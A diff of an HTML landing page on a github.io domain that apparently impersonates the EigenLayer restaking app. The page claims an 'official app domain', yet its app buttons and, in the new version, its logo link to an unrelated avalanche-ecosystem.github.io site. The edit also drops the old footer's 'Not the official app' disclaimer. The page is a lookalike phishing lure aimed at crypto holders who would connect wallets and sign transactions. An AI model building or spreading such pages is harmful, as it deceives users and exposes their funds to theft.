@@ -1,47 +1,124 @@
 <!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>EigenLayer Restaking - Open App</title><meta name="description" content="eigenlayer restaking: open the official app to stake ETH, LSTs, or EIGEN, delegate to an operator, and review risks before signing.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://eigenlayer-restaking.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="EigenLayer Restaking - Open App"><meta property="og:description" content="eigenlayer restaking: open the official app to stake ETH, LSTs, or EIGEN, delegate to an operator, and review risks before signing.">
-<meta property="og:url" content="https://eigenlayer-restaking.github.io/"><meta property="og:image" content="https://eigenlayer-restaking.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="EigenLayer Restaking - Open App"><meta name="twitter:description" content="eigenlayer restaking: open the official app to stake ETH, LSTs, or EIGEN, delegate to an operator, and review risks before signing."><meta name="twitter:image" content="https://eigenlayer-restaking.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://eigenlayer-restaking.github.io/#website", "url": "https://eigenlayer-restaking.github.io/", "name": "EigenLayer"}, {"@type": "WebPage", "@id": "https://eigenlayer-restaking.github.io/#webpage", "url": "https://eigenlayer-restaking.github.io/", "name": "EigenLayer Restaking - Open App", "description": "eigenlayer restaking: open the official app to stake ETH, LSTs, or EIGEN, delegate to an operator, and review risks before signing.", "inLanguage": "en", "isPartOf": {"@id": "https://eigenlayer-restaking.github.io/#website"}}, {"@type": "Organization", "@id": "https://eigenlayer-restaking.github.io/#org", "name": "EigenLayer", "url": "https://eigenlayer-restaking.github.io/", "logo": "https://eigenlayer-restaking.github.io/og-cover.png", "sameAs": ["https://twitter.com/eigencloud", "https://github.com/Layr-Labs", "https://www.coingecko.com/en/coins/eigencloud", "https://defillama.com/protocol/eigencloud"]}, {"@type": "WebApplication", "@id": "https://eigenlayer-restaking.github.io/#app", "name": "EigenLayer Restaking", "url": "https://eigenlayer-restaking.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "eigenlayer restaking: open the official app to stake ETH, LSTs, or EIGEN, delegate to an operator, and review risks before signing.", "featureList": ["Official app domain", "Ethereum Mainnet", "Liquid and native paths"], "isPartOf": {"@id": "https://eigenlayer-restaking.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://eigenlayer-restaking.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is EigenLayer restaking?", "acceptedAnswer": {"@type": "Answer", "text": "EigenLayer restaking is a mechanism that lets users use ETH, liquid staking tokens, EIGEN or supported ERC-20 assets to provide cryptoeconomic security to Autonomous Verifiable Services. The user deposits through EigenLayer contracts and delegates to an operator, while AVSs can use that delegated security for their services."}}, {"@type": "Question", "name": "Can I restake stETH on EigenLayer?", "acceptedAnswer": {"@type": "Answer", "text": "EigenLayer's liquid restaking path supports assets displayed in the Token tab of the official app. LST support can change by strategy and protocol configuration, so users should not rely on an old list. Open the official app, check the current supported asset list and verify the token contract before approving any stETH or other LST deposit."}}, {"@type": "Question", "name": "Does EigenLayer restaking require running a validator?", "acceptedAnswer": {"@type": "Answer", "text": "Liquid restaking does not require the user to run an Ethereum validator. Native ETH restaking is different and uses an EigenPod connected to validator operations. If you only hold an LST or supported token in a wallet, use the liquid restaking guide; if you operate validators, review the native restaking documentation."}}, {"@type": "Question", "name": "What is an EigenLayer operator?", "acceptedAnswer": {"@type": "Answer", "text": "An EigenLayer operator runs software for AVSs and can receive delegated restaked assets from stakers. Delegation is important because operator behavior and AVS participation can affect rewards and risk. A restaker should evaluate operator reputation, supported services, risk disclosures and delegation status before assigning restaked balance."}}, {"@type": "Question", "name": "Can EigenLayer restaking be slashed?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, slashing is part of the EigenLayer risk model when operator sets and AVS commitments apply. The official overview describes slashing as a penalty for improperly or inaccurately completing AVS tasks. The practical implication is that restaking can expose funds to risks beyond ordinary ETH staking or holding an LST."}}, {"@type": "Question", "name": "What is EIGEN used for in EigenLayer?", "acceptedAnswer": {"@type": "Answer", "text": "EIGEN is the token associated with EigenLayer and EigenCloud. The official overview states that EIGEN can be among the assets staked into EigenLayer smart contracts. Token market data belongs on sources such as CoinGecko, while staking mechanics, rewards and protocol rules should be checked in official EigenLayer documentation."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="EigenLayer"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">EigenLayer</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>EigenLayer Restaking</h1>
-      <div class="bridge-widget" role="group" aria-label="EigenLayer preview"><div class="bw-field"><span class="bw-coin mono">ETH</span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH/LST/EIGEN</b> · Ethereum Mainnet</span></span></div><div class="bw-apy"><b>APY</b><span>est*</span></div><div class="bw-field"><span class="bw-coin mono">EIG</span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>EigenLayer</b> · Ethereum Mainnet</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open EigenLayer ↗</a></div>
-      <p class="hero-note">Live preview — APY is indicative; check the live rate in the official EigenLayer app.</p>
-      <div class="trust-row"><span class="trust-chip">Official app domain</span><span class="trust-chip">Ethereum Mainnet</span><span class="trust-chip">Liquid and native paths</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is EigenLayer Restaking?</h2><div class="capsule"><strong>EigenLayer</strong> is an Ethereum protocol that introduces restaking so users can extend <a class="inline-link" href="https://www.binance.com/en/academy/article/what-is-cryptoeconomic-security" rel="noopener noreferrer">cryptoeconomic security</a> to <a class="inline-link" href="https://2039955362-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FPy2Kmkwju3mPSo9jrKKt%2Fuploads%2F9tExk4U2OdiRKGEsUWqW%2FEigenLayer_WhitePaper.pdf?alt=media" rel="noopener noreferrer">Autonomous Verifiable Services</a>, as described in the <a href="https://docs.eigencloud.xyz/eigenlayer/concepts/eigenlayer-overview">official EigenLayer docs</a>. The app supports liquid restaking flows and native ETH restaking paths with operator delegation and documented slashing considerations.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>EigenLayer Restaking at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Ethereum restaking protocol</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://ethereum.org/en/developers/docs/networks/" rel="noopener noreferrer">Ethereum Mainnet</a></b></div><div class="f"><small>Token</small><b>EIGEN</b></div><div class="f"><small>Custody</small><b>Smart-contract deposits with operator delegation</b></div><div class="f"><small>Official app</small><b>app.eigenlayer.xyz</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>EigenLayer restaking rewards and APR</h2><div class="intent-a">EigenLayer restaking rewards are not a fixed APR like a simple savings account. Restakers may receive rewards tied to EigenLayer, AVSs, operator participation and <a class="inline-link" href="https://messari.io/report/eigenlayer-the-restaking-collective" rel="noopener noreferrer">supported asset strategies</a>, while native ETH staking economics remain separate from additional restaking incentives. The official docs describe EigenLayer as a protocol where Native ETH, LSTs, EIGEN or ERC-20 assets can extend security to AVSs. For searchers comparing APR, the extractable answer is: do not assume a single EigenLayer APY. Check the live app, asset strategy, operator, reward token, claim status and slashing exposure before depositing.</div></div></section><section class="section"><div class="container"><h2>EigenLayer restaking supported assets</h2><div class="intent-a">EigenLayer restaking supports multiple asset paths rather than only ETH. The official overview says users can stake Native ETH, Liquid Staking Tokens, the EIGEN token or <a class="inline-link" href="https://ethereum.org/en/developers/docs/standards/tokens/erc-20/" rel="noopener noreferrer">ERC-20 tokens</a> into EigenLayer smart contracts. In the web app, supported liquid assets are shown under the Token tab, while native ETH restaking uses a different <a class="inline-link" href="https://www.theblock.co/post/278283/eigenlayer-eigenpod" rel="noopener noreferrer">EigenPod</a>-based path. Asset availability can change with strategy support and protocol releases, so users should rely on the live app for the current list and verify the token contract before approving deposits.</div></div></section><section class="section section-alt"><div class="container"><h2>How to restake on EigenLayer and delegate an operator</h2><div class="intent-a">To restake on EigenLayer, open <a href="https://app.eigenlayer.xyz/">the official EigenLayer app</a> on Ethereum Mainnet, connect a <a class="inline-link" href="https://www.coinbase.com/learn/crypto-basics/what-is-a-web3-wallet" rel="noopener noreferrer">Web3 wallet</a>, choose an available asset, enter the amount and submit the deposit flow. If the wallet has not delegated yet, the app prompts the user to select an operator. The official liquid restaking guide explains that first-time token deposits require an approval and that users may receive deposit and delegation transaction prompts. Review operator details, wallet permissions and withdrawal expectations before signing.</div></div></section><section class="section"><div class="container"><h2>EigenLayer restaking withdrawal and undelegation</h2><div class="intent-a">EigenLayer restaking withdrawals depend on the asset path and protocol withdrawal flow. Liquid restaking, native ETH restaking and operator delegation are not the same action. Users should use the official app or documented contract flow, check whether they are unstaking, <a class="inline-link" href="https://resources.cryptocompare.com/asset-management/16861/1726472627167.pdf" rel="noopener noreferrer">queueing a withdrawal</a>, changing delegation or withdrawing from an EigenPod, and confirm the expected delay before signing. Because restaking can include AVS and operator relationships, a withdrawal may involve more steps than a standard token transfer. Never use a support link to bypass the official app.</div></div></section><section class="section section-alt"><div class="container"><h2>EigenLayer restaking risks and slashing</h2><div class="intent-a">EigenLayer restaking adds risk on top of ordinary asset holding or ETH staking. The official overview identifies slashing as a penalty when tasks assigned in operator sets by an AVS are completed improperly or inaccurately, resulting in loss or burning of funds. <a class="inline-link" href="https://www.investopedia.com/terms/s/smart-contracts.asp" rel="noopener noreferrer">Smart-contract risk</a>, operator behavior, AVS risk, withdrawal timing and token approval mistakes all matter. Restakers should understand which operator they delegate to, which services that operator supports, and whether the asset path they choose is liquid restaking, native ETH restaking or EIGEN-related.</div></div></section>
-  <section class="section"><div class="container"><h2>How to stake EigenLayer Restaking</h2><ol class="steps"><li><b>Open the app</b><span>Go to app.eigenlayer.xyz on Ethereum Mainnet and connect a Web3 wallet you control.</span></li><li><b>Choose an asset</b><span>Use the token view for supported liquid assets, or follow the native ETH path if you operate an Ethereum validator.</span></li><li><b>Pick an operator</b><span>Delegate available restaked balance to an operator; EigenLayer documents delegation as a single-operator, all-or-nothing action.</span></li><li><b>Approve and sign</b><span>Review token approvals, deposit and delegation prompts, then confirm transactions in your wallet.</span></li></ol><div class="cta-band"><div><p>Ready to stake?</p><p class="sub">Open the official EigenLayer app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open EigenLayer ↗</a></div></div></section>
-  <section class="section"><div class="container"><h2>EigenLayer restaking vs <a class="inline-link" href="https://www.investopedia.com/ethereum-staking-8628363" rel="noopener noreferrer">regular ETH staking</a></h2><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>EigenLayer restaking</th><th>Regular ETH staking</th></tr></thead><tbody><tr><td>Purpose</td><td>Extends security to AVSs through restaked assets</td><td>Secures Ethereum consensus</td></tr><tr><td>Assets</td><td>Native ETH, LSTs, EIGEN and supported ERC-20 strategies</td><td>Native ETH or liquid staking tokens via separate protocols</td></tr><tr><td>Delegation</td><td>Delegate restaked balance to an EigenLayer operator</td><td>Validator operation or staking provider delegation</td></tr><tr><td>Risk</td><td>Smart-contract, operator, AVS and slashing exposure</td><td>Validator, provider, liquidity and protocol risk</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>EigenLayer Restaking FAQ</h2><div class="faq-list"><details open><summary><h3>What is EigenLayer restaking?</h3></summary><div>EigenLayer restaking is a mechanism that lets users use ETH, liquid staking tokens, EIGEN or <a class="inline-link" href="https://www.binance.com/en/academy/article/what-is-eigenlayer" rel="noopener noreferrer">supported ERC-20 assets</a> to provide cryptoeconomic security to Autonomous Verifiable Services. The user deposits through EigenLayer contracts and delegates to an operator, while AVSs can use that delegated security for their services.</div></details><details><summary><h3>Can I restake stETH on EigenLayer?</h3></summary><div>EigenLayer's liquid restaking path supports assets displayed in the Token tab of the official app. LST support can change by strategy and protocol configuration, so users should not rely on an old list. Open the official app, check the current supported asset list and verify the token contract before approving any stETH or other LST deposit.</div></details><details><summary><h3>Does EigenLayer restaking require running a validator?</h3></summary><div>Liquid restaking does not require the user to run an Ethereum validator. Native ETH restaking is different and uses an EigenPod connected to validator operations. If you only hold an LST or supported token in a wallet, use the <a class="inline-link" href="https://docs.eigencloud.xyz/products/eigenlayer/restakers/restaking-guides/restaking-user-guide/liquid-restaking" rel="noopener noreferrer">liquid restaking guide</a>; if you operate validators, review the native restaking documentation.</div></details><details><summary><h3>What is an EigenLayer operator?</h3></summary><div>An EigenLayer operator runs software for AVSs and can receive delegated restaked assets from stakers. Delegation is important because operator behavior and AVS participation can affect rewards and risk. A restaker should evaluate operator reputation, supported services, risk disclosures and delegation status before assigning restaked balance.</div></details><details><summary><h3>Can EigenLayer restaking be slashed?</h3></summary><div>Yes, slashing is part of the EigenLayer risk model when operator sets and AVS commitments apply. The official overview describes slashing as a penalty for improperly or inaccurately completing AVS tasks. The practical implication is that restaking can expose funds to risks beyond ordinary ETH staking or holding an LST.</div></details><details><summary><h3>What is EIGEN used for in EigenLayer?</h3></summary><div>EIGEN is the token associated with EigenLayer and EigenCloud. The official overview states that EIGEN can be among the assets staked into EigenLayer smart contracts. Token market data belongs on sources such as CoinGecko, while staking mechanics, rewards and protocol rules should be checked in official EigenLayer documentation.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid"></div>
-  <p class="footer-note">Not the official app; verify app.eigenlayer.xyz before signing. Educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top ↑</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>EigenLayer Restaking</title>
+  <meta name="description" content="EigenLayer Restaking lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.">
+  <link rel="canonical" href="https://eigenlayer-restaking.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F6F2">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="EigenLayer Restaking">
+  <meta property="og:description" content="EigenLayer Restaking lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.">
+  <meta property="og:url" content="https://eigenlayer-restaking.github.io/">
+  <meta property="og:image" content="https://eigenlayer-restaking.github.io/favicon.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="EigenLayer Restaking">
+  <meta name="twitter:description" content="EigenLayer Restaking lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://eigenlayer-restaking.github.io/#website",
+        "url": "https://eigenlayer-restaking.github.io/",
+        "name": "EigenLayer Restaking",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://eigenlayer-restaking.github.io/#organization",
+        "name": "EigenLayer",
+        "url": "https://eigenlayer-restaking.github.io/",
+        "sameAs": [
+          "https://www.eigencloud.xyz/",
+          "https://github.com/Layr-Labs",
+          "https://x.com/eigenlayer"
+        ]
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://eigenlayer-restaking.github.io/#app",
+        "name": "EigenLayer Restaking",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://eigenlayer-restaking.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="EigenLayer Restaking">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>EigenLayer Restaking</span>
+    </a>
+    <nav class="nav" aria-label="Trusted references">
+      <a href="https://etherscan.io/token/0xec53bf9167f50cdeb3ae105f56099aaab9061f83" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/staking/" target="_blank" rel="nofollow noopener noreferrer">Ethereum staking</a>
+      <a href="https://defillama.com/protocol/eigencloud" target="_blank" rel="nofollow noopener noreferrer">DefiLlama</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">EigenLayer Restaking</h1>
+      <p class="sub"><strong>EigenLayer Restaking</strong> lets you restake ETH and liquid staking tokens to help secure other protocols from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Restaking route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">Restake</span>
+          <span class="chip">
+            <img src="steth.png" width="28" height="28" alt="stETH">
+            <span>stETH</span>
+          </span>
+        </div>
+        <button class="toggle" type="button" data-toggle aria-label="Switch route">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">Secure with</span>
+          <span class="chip">
+            <img src="eigen.png" width="28" height="28" alt="EIGEN">
+            <span>EIGEN</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+    </section>
+  </main>
+
+  <footer class="footer">EigenLayer Restaking &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-toggle]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
